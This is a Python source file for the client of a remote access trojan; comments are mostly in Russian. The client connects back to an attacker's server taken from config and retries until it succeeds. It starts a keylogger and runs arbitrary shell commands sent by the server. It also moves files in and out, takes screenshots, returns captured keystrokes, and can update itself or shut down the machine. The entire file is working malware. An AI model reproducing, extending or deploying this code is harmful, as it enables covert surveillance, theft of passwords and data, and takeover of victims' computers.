import socket
import subprocess
import time
import json
import os
import base64
import ctypes
import sys
import pyautogui
import PIL
import commands
import key_logger
import config

from contextlib import contextmanager
import threading
import _thread

class TimeoutException(Exception):
    def __init__(self, msg=''):
        self.msg = msg

@contextmanager
def time_limit(seconds, msg=''):
    timer = threading.Timer(seconds, lambda: _thread.interrupt_main())
    timer.start()
    try:
        yield
    except KeyboardInterrupt:
        print("выполнение не уложилось в заданный срок")
    finally:
        # if the action ends in specified time, timer is canceled
        timer.cancel()



class Client:

    # Отправляем json данные серверу
    def send_json(self, data):
        """отправка данных серверу"""
        # Если данные окажутся строкой
        try:
            json_data = json.dumps(data.decode('utf-8'))
        except:
            json_data = json.dumps(data) 
        self.connection.send(json_data.encode('utf-8'))



    # Получаем json данные от сервера
    def receive_json(self):
        """получение данных от сервера"""
        json_data = ''
        while True:
            try:
                json_data += self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                pass
            except Exception:
                print("Подключение зарыто. переход в режим ожидания")
                restarter(self)


    def __init__(self, ip, port):
        # Try to connect to the server, if failed wait five seconds and try again.
        while True:
            try:
                self.connection = socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM)
                print("try")
                self.connection.connect((ip, port))
            except socket.error:
                time.sleep(5)
            else:
                print("подключен")
                break
        # запуск кейлоггера
        self.keylogger = key_logger.KeyLogger()
        res = self.keylogger.start()
        if res != None:
            print(res)

    def arrayToString(self, s):
        """переводит массив в строку"""
        convStr = ""
        for i in s:
            convStr += i
        return convStr

    # Запускает любую конанду в консоле
    def runCommand(self, command):
        """запускает команду в консоле"""
        stdout = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        # proc = subprocess.Popen('cmd.exe', stdin = subprocess.PIPE, stdout = subprocess.PIPE)
        print(command)
        # stdout, stderr = proc.communicate(command.encode())
        try:
            stdout = stdout.decode('utf-8')
        except Exception:
            stdout = str(stdout)
        print(stdout)
        return stdout

    # Reading files with base 64 encryption for non UTF-8 compatability
    def readFile(self, path):
        """читает файл с кодированием"""
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    # Writing files, decode the b64 from the above function
    @staticmethod
    def writeFile(path, content):
        """Записывает файл с кодирование"""
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "Загрузка завершена"
    
    # Обработать изображение с экрана
    def screen_handler(self):
        """делает скриншот"""
        try:
            pyautogui.screenshot('1.png')
            with open('1.png', 'rb') as file:
                reader = base64.b64encode(file.read())
            os.remove('1.png')
            return reader
        except Exception as err:
            print(err)
            raise Exception()

    def run(self):
        while True:
            command = self.receive_json()
            if command != ["ping"]:
                print(command)
            num_time_limit = 18
            if "time_limit" in command:
                num_time_limit = int(command.split("time_limit"))
            complited = False
            with time_limit(num_time_limit, "sleep"):
                try:
                    match command[0]:
                        case "ping":
                            command_response = "pong"
                        case "exit":
                            self.connection.close()
                            sys.exit()
                        case "ratHelp":
                            command_response = ""
                        case "cd":
                            if len(command) > 1:
                                os.chdir(command[1])
                            # convCommand = self.arrayToString(command)
                            convCommand = " ".join(command)
                            command_response = self.runCommand(convCommand)
                        case "upload":
                            command_response = self.writeFile(command[1], command[2])
                        case "download":
                            command_response = self.readFile(command[1]).decode()
                        case "message":
                            command_response = commands.message(command[1:])
                        case "lock":
                            command_response = commands.lock_pc()
                        case "shutdown":
                            command_response = commands.shutdown_pc()
                        case "restart":
                            command_response = commands.restart_pc()
                        case "screenshot":
                            command_response = self.screen_handler()
                        case "hotkey":
                            command_response = commands.hotkey(command[1:])
                        case "screamer":
                            command_response = commands.screamer()
                        case "syscom":
                            command_response = commands.sys_command(command[1:])
                        case "drop":
                            command_response = commands.drop(command[1], command[2])
                        case "update_client":
                            command_response = commands.update_client(command[1], command[2])
                            self.send_json(command_response)
                            self.connection.close()
                            exit()
                        case "clires":
                            self.send_json(commands.restart_client())
                            self.connection.close()
                            exit()
                        case "keylogger":
                            command_response = self.keylogger.get_keylogs()
                        case "dir":
                            command_response = os.listdir()
                        case _:
                            # convCommand = self.arrayToString(command)
                            convCommand = " ".join(command)
                            command_response = command_response = self.runCommand(convCommand)
                # Whole error handling, bad practice but required to keep connection
                except Exception as e:
                    command_response = (f"Ошибка выполнения команды: {e}")
                self.send_json(command_response)
                complited = True
            if not complited:
                self.send_json("выполнение не уложилось в заданный срок")
                complited = True


def restarter(client: Client):
    """перезапускает клиента, но не сам файл"""
    client.connection.close()
    print("run")
    rat_client: Client = Client(config.SERVER_IP, config.SERVER_PORT)
    rat_client.run()


print("run")
rat_client: Client = Client(config.SERVER_IP, config.SERVER_PORT)
rat_client.run()